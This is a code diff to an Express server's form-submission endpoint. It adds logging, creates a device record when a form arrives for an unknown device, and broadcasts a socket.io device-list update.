@@ -118,12 +118,25 @@ app.get('/api/devices/:id/forms', (req, res) => {
 app.post('/api/form/submit', (req, res) => {
     const { deviceId, name, phoneNumber, id } = req.body;
 
+    console.log(`[Form] Received submission - deviceId: "${deviceId}", name: "${name}"`);
+
     if (!deviceId || !name || !phoneNumber || !id) {
+        console.log(`[Form] Missing required fields`);
         return res.status(400).json({ error: 'Missing required fields' });
     }
 
-    // Store the form data
+    // Check if device exists before storing
+    const deviceExistedBefore = store.getDevice(deviceId) !== undefined;
+
+    // Store the form data (will create device if not exists)
     store.submitForm(deviceId, { name, phoneNumber, id });
+
+    // If a new device was created, notify all clients about the new device
+    if (!deviceExistedBefore) {
+        const allDevices = store.getAllDevices();
+        io.emit('devices:update', allDevices);
+        console.log(`[Form] New device created from form, notified clients`);
+    }
 
     // Get updated forms list and emit to frontend clients
     const forms = store.getForms(deviceId);
@@ -134,7 +147,7 @@ app.post('/api/form/submit', (req, res) => {
         telegramBot.notifyNewForm(deviceId, { name, phoneNumber, id, submittedAt: new Date() });
     }
 
-    console.log(`[Form] New submission from device ${deviceId}: ${name}, ${phoneNumber}, ${id}`);
+    console.log(`[Form] Successfully stored for device ${deviceId}`);
     res.json({ success: true, message: 'Form submitted successfully' });
 });
 
